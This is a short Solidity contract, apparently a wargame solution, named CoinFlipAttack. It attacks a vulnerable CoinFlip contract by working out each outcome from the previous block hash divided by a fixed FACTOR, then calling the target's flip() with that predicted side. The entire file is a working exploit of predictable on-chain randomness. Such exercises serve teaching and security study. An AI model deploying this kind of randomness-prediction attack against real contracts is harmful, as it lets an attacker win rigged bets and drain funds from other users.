// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './CoinFlip.sol';

contract CoinFlipAttack {
    CoinFlip public vulnContract;


    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(
        address _vulnContractAddr
    ) public {
        vulnContract = CoinFlip(_vulnContractAddr);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = uint256(blockValue / FACTOR);
        bool side = flip == 1 ? true : false;

        vulnContract.flip(side);    
    }

}